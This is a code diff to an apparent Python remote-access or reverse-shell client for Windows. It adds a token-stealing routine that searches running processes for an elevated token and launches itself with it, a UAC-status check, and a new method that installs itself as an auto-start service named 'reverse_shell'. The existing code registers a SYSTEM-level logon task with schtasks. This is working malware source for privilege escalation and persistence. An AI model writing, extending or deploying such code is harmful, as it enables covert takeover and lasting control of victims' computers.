@@ -12,6 +12,7 @@ import winreg
 from ctypes import wintypes
 
 import cv2
+import ntsecuritycon
 import psutil
 import pyautogui
 import win32api
@@ -222,12 +223,19 @@ class ClientUtil:
 
     @staticmethod
     def stealtoken_admin():
-        try:
-            enable_privilege()
-            create_process(get_pid('SystemSettingsAdminFlows.exe'))
-            return '[+] Get administrator privileges success'
-        except Exception as exception:
-            return '[-] Error: ' + str(exception)
+        if not is_uac_enabled():
+            return '[-] UAC is disabled'
+        enable_privilege()
+        for proc in psutil.process_iter():
+            try:
+                process_name = proc.name()
+                process_id = proc.pid
+                if get_elevation_type(process_id) == win32security.TokenElevationTypeFull:
+                    create_process(process_id)
+                    return '[+] Steal token from {0} (PID: {1})'.format(process_name, process_id)
+            except:
+                pass
+        return '[-] Cannot find any elevated processes'
 
     @staticmethod
     def persistence_registry():
@@ -251,6 +259,21 @@ class ClientUtil:
                     'schtasks.exe /create /tn reverse_shell /sc onlogon /ru system /rl highest /f /tr ' + executable_path,
                     shell=True)
                 return '[+] Schedule task success'
+            else:
+                return '[-] Operation requires elevation'
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def persistence_service():
+        try:
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                executable_path = os.path.realpath(sys.executable)
+                cmd = subprocess.Popen(
+                    'sc create reverse_shell binpath=" ' + executable_path + '" start= auto',
+                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                return '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
+                                                            locale.getdefaultlocale()[1])
             else:
                 return '[-] Operation requires elevation'
         except Exception as exception:
@@ -355,6 +378,18 @@ def create_process(pid):
                                                             win32security.SECURITY_ATTRIBUTES())
     ctypes.windll.advapi32.CreateProcessWithTokenW(int(duplicate_token_handle), 1, current_path, None, creation_flags,
                                                    None, None, ctypes.byref(si), ctypes.byref(pi))
+
+
+def get_elevation_type(pid):
+    process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
+    token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_QUERY)
+    elevation_type = win32security.GetTokenInformation(token_handle, ntsecuritycon.TokenElevationType)
+    return elevation_type
+
+
+def is_uac_enabled():
+    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
+    return winreg.QueryValueEx(key, "EnableLUA")[0]
 
 
 while True:
